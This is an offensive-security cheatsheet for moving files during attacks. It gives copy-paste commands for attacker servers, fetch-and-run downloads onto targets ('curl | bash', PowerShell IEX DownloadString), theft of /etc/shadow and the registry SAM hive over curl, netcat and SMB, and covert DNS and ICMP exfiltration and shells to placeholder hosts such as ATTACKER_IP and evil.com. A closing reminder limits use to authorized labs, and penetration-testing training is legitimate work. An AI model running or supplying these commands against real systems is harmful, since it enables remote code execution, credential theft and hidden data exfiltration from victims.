# 📋 File Transfer Cheatsheet — Quick Reference

> **Bookmark this page!** Quick copy-paste commands for every file transfer situation.

---

## 🚀 ATTACKER SETUP (Start a Server)

### HTTP Server

```bash
# Python 3 (MOST COMMON)
python3 -m http.server 80

# Python 3 with upload support
pip install uploadserver && python3 -m uploadserver 80

# PHP
php -S 0.0.0.0:80

# Apache
sudo systemctl start apache2 && sudo cp files/* /var/www/html/
```

### SMB Server

```bash
# Basic (Kali)
impacket-smbserver share $(pwd) -smb2support

# With auth (Windows 10+ requires this)
impacket-smbserver share $(pwd) -smb2support -user hacker -password hacker123
```

### FTP Server

```bash
# Python
pip install pyftpdlib && python3 -m pyftpdlib -p 21 --write

# With credentials
python3 -m pyftpdlib -p 21 --user=hacker --password=pass --write
```

### Netcat Listener (Receive file)

```bash
nc -nlvp 9001 > received_file
```

### Netcat Serve file

```bash
nc -nlvp 4444 < file_to_send
```

---

## ⬇️ DOWNLOAD TO LINUX TARGET

| Method | Command |
| --- | --- |
| **wget** | `wget http://IP/file -O /tmp/file` |
| **wget fileless** | `wget http://IP/file -O - \| bash` |
| **curl** | `curl http://IP/file -o /tmp/file` |
| **curl fileless** | `curl http://IP/file \| bash` |
| **scp** | `scp user@IP:/path/file /tmp/` |
| **scp (key)** | `scp -i key user@IP:/path/file /tmp/` |
| **netcat** | `nc ATTACKER_IP 4444 > /tmp/file` |
| **/dev/tcp** | `cat < /dev/tcp/IP/PORT > /tmp/file` |
| **python3** | `python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP/file','/tmp/file')"` |
| **php** | `php -r "copy('http://IP/file','/tmp/file');"` |
| **ftp** | `wget ftp://IP/file` |
| **base64** | `echo 'BASE64STRING' \| base64 -d > /tmp/file` |

---

## ⬇️ DOWNLOAD TO WINDOWS TARGET

| Method | Command |
| --- | --- |
| **PowerShell IWR** | `iwr http://IP/file -o C:\Temp\file` |
| **PS DownloadFile** | `(New-Object Net.WebClient).DownloadFile('http://IP/file','C:\Temp\file')` |
| **PS Fileless** | `IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')` |
| **Certutil** | `certutil -urlcache -split -f http://IP/file C:\Temp\file` |
| **Bitsadmin** | `bitsadmin /transfer j /download /priority high http://IP/file C:\Temp\file` |
| **SMB copy** | `copy \\IP\share\file C:\Temp\file` |
| **SMB run** | `\\IP\share\file.exe` (run directly from share) |
| **SMB net use** | `net use Z: \\IP\share` then `copy Z:\file C:\Temp\` |
| **FTP** | `echo open IP > f.txt & echo USER anonymous >> f.txt & echo binary >> f.txt & echo GET file >> f.txt & echo bye >> f.txt & ftp -s:f.txt` |
| **MpCmdRun** | `MpCmdRun.exe -DownloadFile -url http://IP/file -path C:\Temp\file` |
| **Esentutl** | `esentutl.exe /y \\IP\share\file /d C:\Temp\file /o` |

---

## ⬆️ UPLOAD FROM LINUX TARGET (Exfiltrate)

| Method | Command |
| --- | --- |
| **curl POST** | `curl -X POST http://IP/upload -F 'file=@/etc/shadow'` |
| **curl FTP** | `curl -T /etc/shadow ftp://IP/` |
| **scp** | `scp /etc/shadow user@ATTACKER:/tmp/` |
| **netcat** | `cat /etc/shadow \| nc ATTACKER_IP 9001` |
| **tar + nc** | `tar czf - /dir \| nc ATTACKER_IP 9001` |
| **base64** | `base64 -w 0 /etc/shadow` (copy-paste output) |
| **python** | `python3 -c "import requests; requests.post('http://IP/upload', files={'f': open('/etc/shadow','rb')})"` |

---

## ⬆️ UPLOAD FROM WINDOWS TARGET (Exfiltrate)

| Method | Command |
| --- | --- |
| **SMB copy** | `copy C:\file \\ATTACKER_IP\share\` |
| **PS WebClient** | `(New-Object Net.WebClient).UploadFile('http://IP/upload','C:\file')` |
| **PS IWR POST** | `Invoke-WebRequest -Uri http://IP/upload -Method POST -InFile C:\file` |
| **FTP script** | `echo open IP > u.txt & echo binary >> u.txt & echo PUT C:\file >> u.txt & echo bye >> u.txt & ftp -s:u.txt` |
| **Certutil encode** | `certutil -encode C:\file C:\encoded.txt` (then exfil text) |
| **Reg save + SMB** | `reg save HKLM\SAM C:\s & copy C:\s \\IP\share\` |

---

## 🔐 ENCRYPTED TRANSFERS

| Method | Command |
| --- | --- |
| **SCP** | `scp file user@IP:/path/` |
| **SFTP** | `sftp user@IP` → `get file` / `put file` |
| **Ncat SSL** | Listen: `ncat --ssl -nlvp 4444 > file` / Send: `ncat --ssl IP 4444 < file` |
| **Socat SSL** | `socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 FILE:file` |
| **SSH pipe** | `ssh user@IP "cat /file" > local_file` |

---

## 🕵️ STEALTH / ENCODED TRANSFERS

| Method | Encode | Decode |
| --- | --- | --- |
| **Base64 (Linux)** | `base64 -w 0 file > enc.txt` | `base64 -d enc.txt > file` |
| **Base64 (Win)** | `certutil -encode file enc.txt` | `certutil -decode enc.txt file` |
| **Hex** | `xxd -p file > hex.txt` | `xxd -r -p hex.txt > file` |
| **Gzip+B64** | `gzip -c file \| base64 -w 0` | `echo DATA \| base64 -d \| gunzip > file` |
| **PS Encoded Cmd** | Encode with UTF-16LE | `powershell -enc BASE64STRING` |

---

## 🕳 COVERT EXFILTRATION

| Channel | Tool | Command |
| --- | --- | --- |
| **DNS tunnel** | iodine | `iodined -f 10.0.0.1 tunnel.domain.com` (server) |
| **DNS exfil** | manual | `nslookup "$(echo data \| base64).evil.com"` |
| **DNS shell** | dnscat2 | `dnscat2-server domain.com` |
| **ICMP tunnel** | ptunnel-ng | `ptunnel-ng -s` (server) |
| **ICMP shell** | icmpsh | `icmpsh_m.py ATTACKER TARGET` |

---

## 🔧 COMMON PORT REFERENCE

| Service | Port | Protocol | Encrypted |
| --- | --- | --- | --- |
| HTTP | 80 | TCP | ❌ |
| HTTPS | 443 | TCP | ✅ |
| SSH/SCP/SFTP | 22 | TCP | ✅ |
| SMB | 445 | TCP | ❌ |
| FTP Control | 21 | TCP | ❌ |
| FTP Data | 20 | TCP | ❌ |
| TFTP | 69 | UDP | ❌ |
| DNS | 53 | UDP/TCP | ❌ |
| ICMP | N/A | ICMP | ❌ |

---

## 🎯 QUICK DECISION GUIDE

```text
Need to transfer to WINDOWS?
  ├── PowerShell available? → iwr http://IP/file -o C:\Temp\file
  ├── Only cmd.exe?         → certutil -urlcache -split -f http://IP/file C:\Temp\file
  ├── SMB access?           → copy \\IP\share\file C:\Temp\
  ├── Want fileless?        → IEX(New-Object Net.WebClient).DownloadString('http://IP/file')
  └── Nothing works?        → Base64 copy-paste via certutil -decode

Need to transfer to LINUX?
  ├── wget available?       → wget http://IP/file
  ├── curl available?       → curl http://IP/file -o file
  ├── SSH access?           → scp file user@IP:/tmp/
  ├── netcat available?     → nc IP PORT > file
  ├── Only bash?            → cat < /dev/tcp/IP/PORT > file
  └── Nothing works?        → echo "BASE64" | base64 -d > file

Need STEALTH?
  ├── DNS open?             → DNS exfiltration
  ├── ICMP open?            → ICMP tunneling
  └── HTTPS only?           → curl -k -X POST https://IP/exfil -d @file
```

--- 

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
